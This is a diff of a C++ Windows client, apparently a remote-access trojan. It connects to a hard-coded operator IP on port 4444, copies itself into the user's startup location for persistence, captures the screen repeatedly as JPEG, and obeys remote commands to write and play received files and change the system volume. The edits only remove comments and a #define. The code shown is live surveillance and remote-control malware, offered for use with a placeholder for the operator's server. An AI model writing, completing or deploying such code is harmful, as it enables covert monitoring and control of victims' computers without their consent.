@@ -1,5 +1,4 @@
 // client.cpp
-#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -22,8 +21,8 @@
 const char* SERVER_IP = "192.168.0.104"; // <<< CHANGE TO YOUR SERVER IP
 const int PORT = 4444;
 
-// ---------- volume control (modern API, works on Vista+) ----------
-void SetVolume(int vol) { // vol 0..100
+// ---------- volume control ----------
+void SetVolume(int vol) {
     CoInitialize(0);
     IMMDeviceEnumerator* pEnum = 0;
     IMMDevice* pDev = 0;
@@ -40,7 +39,6 @@ void SetVolume(int vol) { // vol 0..100
     CoUninitialize();
 }
 
-// ---------- JPEG encoder ----------
 int GetEncoderClsid(const WCHAR* mime, CLSID* clsid) {
     UINT num=0, size=0;
     Gdiplus::GetImageEncodersSize(&num, &size);
@@ -97,7 +95,6 @@ void CommandListener(SOCKET s) {
             std::ofstream out(f, std::ios::binary);
             out.write(buf.data(), sz);
             out.close();
-            // play asynchronously
             mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0,0,0);
             mciSendStringA("play nyx", 0,0,0);
         }
@@ -105,7 +102,6 @@ void CommandListener(SOCKET s) {
 }
 
 int main() {
-    // startup persistence
     char me[MAX_PATH];
     GetModuleFileNameA(0, me, MAX_PATH);
     std::string start = std::string(getenv("USERPROFILE")) +
@@ -132,7 +128,6 @@ int main() {
             GetEncoderClsid(L"image/jpeg", &jpegClsid);
 
             while(true) {
-                // capture screen
                 HWND hwnd = GetDesktopWindow();
                 HDC hdc = GetDC(hwnd);
                 RECT r; GetClientRect(hwnd, &r);
